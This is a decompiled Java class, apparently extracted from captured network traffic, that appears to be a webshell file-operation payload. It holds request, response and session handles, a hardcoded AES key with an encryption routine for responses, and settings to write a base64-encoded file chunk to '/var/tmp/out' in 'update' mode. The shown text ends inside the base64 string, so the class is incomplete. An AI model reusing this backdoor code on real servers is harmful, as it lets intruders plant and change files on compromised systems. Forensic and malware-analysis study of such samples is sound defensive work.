package org.rfxn;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: compiled from: FileOperation.java */
/* JADX INFO: loaded from: 013_frame_404440.class */
public class Nmjkrcg {
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    public static String hash;
    public static String blockIndex;
    public static String blockSize;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
    private Object Request;
    private Object Response;
    private Object Session;
    private Charset osCharset;

    private byte[] Encrypt(byte[] bArr) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec("1f2c8075acd3d118".getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] bArrDoFinal = cipher.doFinal(bArr);
        try {
            Class<?> cls = Class.forName("java.util.Base64");
            Object objInvoke = cls.getMethod("getEncoder", null).invoke(cls, null);
            bArrDoFinal = (byte[]) objInvoke.getClass().getMethod("encode", byte[].class).invoke(objInvoke, bArrDoFinal);
        } catch (Throwable th) {
            Object objNewInstance = Class.forName("sun.misc.BASE64Encoder").newInstance();
            bArrDoFinal = ((String) objNewInstance.getClass().getMethod("encode", byte[].class).invoke(objNewInstance, bArrDoFinal)).replace("\n", "").replace("\r", "").getBytes();
        }
        return bArrDoFinal;
    }

    public Nmjkrcg() {
        mode = "";
        mode += "update";
        path = "";
        path += "/var/tmp/out";
        blockIndex = "";
        blockIndex += "9";
        blockSize = "";
        blockSize += "30720";
        content = "";
        content += "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